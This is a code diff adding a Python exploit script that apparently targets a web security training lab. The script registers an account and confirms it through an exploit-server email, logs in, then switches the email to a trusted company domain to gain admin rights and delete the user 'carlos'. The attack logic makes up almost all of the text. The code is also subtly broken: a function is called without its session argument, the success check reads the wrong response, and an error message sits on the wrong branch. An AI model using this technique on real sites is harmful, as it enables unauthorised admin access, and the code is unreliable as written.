@@ -1,13 +1,83 @@
 import requests
 import sys
+import re
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}
 
+def get_csrf_token(session, url):
+    res = session.get(url, proxies=proxies, verify=False)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    csrf_input = soup.find('input', {'name': 'csrf'})
+    
+    if csrf_input:
+        csrf_token = csrf_input.get('value')
+        return csrf_token
+    else:
+        print("CSRF token not found in the HTML.")
+        return None
+
+
 def business_logic_exploit(session, url) :
-    pass
+    
+    register_url = url + '/register'
+    
+    csrf_token = get_csrf_token(session, register_url)
+    
+    data = {
+        'csrf':csrf_token, 
+        'username':'wiener', 
+        'email':'test5%40exploit-0a8300e60411b32684f17246018a00ee.exploit-server.net', 
+        'password':'peter'
+    }
+    
+    r = session.post(register_url, data=data, proxies=proxies, verify=False)
+    
+    soup  = BeautifulSoup(r.text, 'html.parser')
+    
+    # Define a regular expression pattern to capture the content between <a> and </a> tags
+    pattern = r"<a[^>]*>(.*?)<\/a>"
+    result = soup.find_all(string=pattern)
+    link = ""
+    
+    for elt in result :
+        if 'http' in elt :
+            link = elt
+            break
+        
+    if link :
+        session.get(link, proxies=proxies, verify=False)
+    
+        # get the csrf token here
+        login_url = url + '/login'
+        csrf_token = get_csrf_token(session, login_url)
+        data = {'csrf':csrf_token, 'username':'wiener', 'password':'peter'}
+        
+        # logging wiht the wiener user here
+        res = session.post(login_url, data=data, proxies=proxies, verify=False)
+        
+        if "Log out" in res.text :
+            print("The wiener user has logged in successfully !!")
+            
+            # Add the wanted product
+            change_email_url = url + '/my-account?id=test'
+            csrf_token = get_csrf_token(change_email_url)
+            email_url = url + '/my-account/change-email'
+            data = {'email':'test@dontwannacry.com', 'csrf':csrf_token}
+            session.post(email_url, data=data, proxies=proxies, verify=False)
+            
+            admin_url = url + '/admin/delete?username=carlos'
+            session.get(admin_url, proxies=proxies, verify=False)
+            
+            if "Congratulations" in r.text :
+                print("The business logic vulnerability has been successfully exploit!")
+            else :
+                print("Failed to exploit the business logic vulnerability!")
+    else :
+        print("Failed to log in!!")
 
 if __name__ == "__main__" :
     try :
